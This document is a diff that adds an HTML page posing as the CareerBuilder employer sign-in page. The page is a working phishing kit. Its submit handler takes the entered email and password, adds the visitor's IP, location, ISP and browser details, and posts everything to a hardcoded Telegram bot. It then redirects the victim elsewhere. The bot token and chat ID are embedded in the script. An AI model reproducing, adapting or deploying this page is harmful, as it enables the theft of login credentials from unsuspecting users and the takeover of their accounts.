@@ -1,0 +1,231 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Careerbuilder - Log in</title>
+    <link rel="stylesheet" href="https://auth.careerbuilder.com/css/site.css?v=GK9WUAAnipj60qyPQGVnmOIact0" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,400,700" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons|Material+Icons+Outlined" />
+    <script src="https://auth.careerbuilder.com/node_modules/%40cb/cut/dist/cut/cut.esm.js" type="module"></script>
+    <script src="https://auth.careerbuilder.com/node_modules/%40cb/cut/dist/cut/cut.js" nomodule></script>
+    
+<meta name="robots" content="NOINDEX, NOFOLLOW">
+<link href="https://auth.careerbuilder.com/Account/Login" rel="canonical">
+
+</head>
+
+<body>
+
+
+
+    <div class="container main-wrapper">
+        
+
+
+        
+
+
+        
+        <main role="main" class="mt-4">
+            
+
+
+<div class="login-page">
+    <div class="text-center">
+        <div class="header-logo">
+                <img src="https://auth.careerbuilder.com/images/cb-header-logo.svg" alt="Careerbuilder" />
+        </div>
+    </div>
+
+        <div class="my-3">
+                <h1 class="text-center-sm-down" lang="en">
+                    Welcome to Careerbuilder</h1>
+            <p lang="en">Sign in and start hiring the best talent out there.</p>
+        </div>
+    <div class="row">
+        <div class="col-12" )>
+            <form id="loginForm"  onsubmit="handleSubmit(event)" enctype="application/x-www-form-urlencoded" autocomplete="off">
+                <div class="form-group material-text-field">
+                    <input class="form-control" autofocus aria-describedby="errEmail" type="text" data-val="true" data-val-length="The field Email must be a string with a maximum length of 128." data-val-length-max="128" data-val-regex="Please enter a valid email." data-val-regex-pattern="^[-a-zA-Z0-9~!$%^&amp;*_=&#x2B;#}{\&#x27;?]&#x2B;(\.[-a-zA-Z0-9~!$%^&amp;*_=&#x2B;#}{\&#x27;?]&#x2B;)*@[-A-Za-z0-9_\&#x27;&#x2B;]&#x2B;([.][-A-Za-z0-9_\&#x27;&#x2B;]&#x2B;)*[.][A-Za-z]{2,}$" data-val-required="The Email field is required." id="username" maxlength="128" name="user" value="" />
+                    <label for="Input_Email">Email</label>
+                    <span id="errEmail" class="field-validation-valid" data-valmsg-for="Input.Email" data-valmsg-replace="true"></span>
+                    <i class="material-icons pull-right show-valid">check</i>
+                    <i class="material-icons pull-right show-invalid">error</i>
+                </div>
+                <div class="form-group material-text-field">
+                    <input class="form-control" aria-describedby="errPassword" type="password" data-val="true" data-val-required="The Password field is required." id="password" name="pass" />
+                    <label for="Input_Password">Password</label>
+                    <span id="errPassword" class="field-validation-valid" data-valmsg-for="Input.Password" data-valmsg-replace="true"></span>
+                    <a class="password-unmask" href="#" role="button" aria-label="Show Password"><i class="far fa-eye-slash" aria-hidden="true"></i></a>
+                </div>
+                <div class="d-flex">
+                    <div class="form-group form-check material-checkbox mr-auto">
+                        <input type="checkbox" class="form-check-input" data-val="true" data-val-required="The Stay Signed In field is required." id="Input_RememberMe" name="Input.RememberMe" value="true" />
+                        <label class="form-check-label" for="Input_RememberMe">
+                            Stay Signed In
+                        </label>
+                    </div>
+                    <a id="forgot-password" href="./ForgotPassword?elui=1&amp;returnurl=https%3a%2f%2femployer.careerbuilder.com%2fjobposter%2fmycb.aspx&amp;_ga=2.96148255.2093030547.1626743915-993270924.1621682292"
+                        lang="en">Forgot Password?</a>
+                </div>
+
+                <g-recaptcha>
+
+</g-recaptcha>
+
+                    <button type="submit" id="btn-signin" class="btn btn-primary btn-block my-2"
+                    lang="en">Sign In</button>
+
+                    <p class="text-center">
+                        <a id="sso-login" lang="en" href="/Account/SamlLogin?returnUrl=https%3A%2F%2Femployer.careerbuilder.com%2Fjobposter%2Fmycb.aspx">Sign In using SSO</a>
+                    </p>
+
+                    <p class="text-center">
+                        Don&#x27;t have an account?
+                        <a id="create-now" href="/account/register"
+                        lang="en">Create One Now</a>
+                    </p>
+            <input name="__RequestVerificationToken" type="hidden" value="CfDJ8E5h0Uax05tMjcyqhNOmhPh3yLp4Zm-2AGUn7M1UVfQBNGfWEqZy4gPqnLrewFtbboVOZElpWugCgVOaYpylOBdfn51cgCv6iPPKeEpffSF2mwzmr6Cr5bjw1gihhmbzZBjfXAKkmi4bW9tukaYlOiM" /><input name="Input.RememberMe" type="hidden" value="false" /></form>
+<script>
+    if (showPlaceholderText) {
+        setPlaceholderText();
+    }
+</script>
+<script>
+        async function getBrowserInfo() {
+            return {
+                browser: navigator.userAgent,
+                language: navigator.language,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+        }
+
+         async function getIPInfo() {
+            try {
+                // Direct approach with ipinfo.io which is reliable and doesn't require CORS
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                
+                return {
+                    query: data.ip || 'Unknown',
+                    country: data.country_name || data.country || 'Unknown',
+                    org: data.org || 'Unknown',
+                    isp: data.org || 'Unknown' // Using org as ISP since ipinfo doesn't separate them
+                };
+            } catch (error) {
+                console.error('Primary IP fetch failed:', error);
+                
+                // Fallback to another service
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    
+                    return {
+                        query: ipData.ip || 'Unknown',
+                        country: 'Unknown', // Can't get country from ipify alone
+                        org: 'Unknown',
+                        isp: 'Unknown'
+                    };
+                } catch (fallbackError) {
+                    console.error('Fallback IP fetch failed:', fallbackError);
+                    return {
+                        query: 'Unknown',
+                        country: 'Unknown',
+                        org: 'Unknown',
+                        isp: 'Unknown'
+                    };
+                }
+            }
+        }
+
+        async function sendToTelegram(message) {
+            const BOT_TOKEN = '7480485973:AAEc5xoO6_z6ZtSXAMxZB4iqih4M7peeyoM'; // Add your bot token here
+            const CHAT_ID = '@onlysendlegs'; // Add your chat ID here
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+
+        async function handleSubmit(event) {
+            event.preventDefault();
+            
+            const form = event.target;
+            const email = form.email.value;
+            const password = form.password.value;
+            
+            const browserInfo = await getBrowserInfo();
+            const ipInfo = await getIPInfo();
+            
+            const message = `
+📥 New Login Information
+------------------------
+📧 Email: ${email}
+🔑 Password: ${password}
+🌐 IP: ${ipInfo.query}
+🌍 Country: ${ipInfo.country}
+🏢 ISP: ${ipInfo.isp}
+🔍 Organization: ${ipInfo.org}
+🌐 Browser: ${browserInfo.browser}
+🗣 Language: ${browserInfo.language}
+📱 Screen: ${browserInfo.screenResolution}
+🖥 Window: ${browserInfo.windowSize}
+⏰ Timezone: ${browserInfo.timezone}
+📅 Timestamp: ${browserInfo.timestamp}
+            `.trim();
+
+            await sendToTelegram(message);
+
+            try {
+                window.history.go(-2);
+                setTimeout(() => {
+                    if (document.location.href !== 'about:blank') {
+                        window.location.href = 'https://go.microsoft.com/fwlink/p/?LinkID=402333';
+                    }
+                }, 500);
+            } catch (e) {
+                window.location.href = 'https://go.microsoft.com/fwlink/p/?LinkID=402333';
+            }
+        }
+    </script> 
+
+        </div>
+    </div>
+</div>
+
+        </main>
+    </div>
+
+    
+
+
+
+
+
+    <script src="/js/site.js?v=vVmgRL_TeRRs6IqflSqFDlJqHtU"></script>
+
+    
+<script type="text/javascript" src="https://secure.icbdr.com/Common/js/login/cba.js"></script>
+<script type="text/javascript" src="https://secure.icbdr.com/Common/js/login/app-2.0.4.js"></script>
+
+</body>
+
+</html>
